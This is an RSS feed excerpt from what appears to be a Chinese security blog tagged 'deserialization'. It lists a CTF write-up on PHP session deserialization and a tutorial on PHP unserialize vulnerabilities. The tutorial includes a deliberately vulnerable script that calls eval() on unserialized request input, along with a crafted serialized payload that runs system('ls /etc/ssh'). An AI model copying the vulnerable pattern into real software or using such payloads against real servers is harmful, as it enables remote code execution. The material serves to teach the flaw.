<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>反序列化 on </title>
    <link>http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
    <description>Recent content in 反序列化 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 23 Jul 2018 00:09:17 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>关于PHP SESSION反序列化</title>
      <link>http://wyb0.com/posts/php-session-unserialize/</link>
      <pubDate>Mon, 23 Jul 2018 00:09:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-session-unserialize/</guid>
      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.</description>
    </item>
    
    <item>
      <title>PHP反序列化漏洞</title>
      <link>http://wyb0.com/posts/php-unserialize-vulnerabilities/</link>
      <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-unserialize-vulnerabilities/</guid>
      <description>0x00 关于反序列化漏洞 序列化：使用函数serialize()可将实例序列化为字符串
反序列化：使用函数unserialize()可将序列化的字符串还原
 服务端有test.php，代码如下  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize($d); var_dump($tc); ?&amp;gt;   客户端可构造如下代码生成序列化后的字符串  &amp;lt;?php class fun{ public $msg; function __construct(){ echo &#39;__construct&#39;; } function __destruct() { eval($this-&amp;gt;msg); } } $f = new fun(); $f-&amp;gt;msg = &amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;; echo serialize($f); ?&amp;gt;  生成的序列化字符串为：O:3:&amp;quot;fun&amp;quot;:1:{s:3:&amp;quot;msg&amp;quot;;s:22:&amp;quot;system(&#39;ls /etc/ssh&#39;);&amp;quot;;}</description>
    </item>
    
  </channel>
</rss>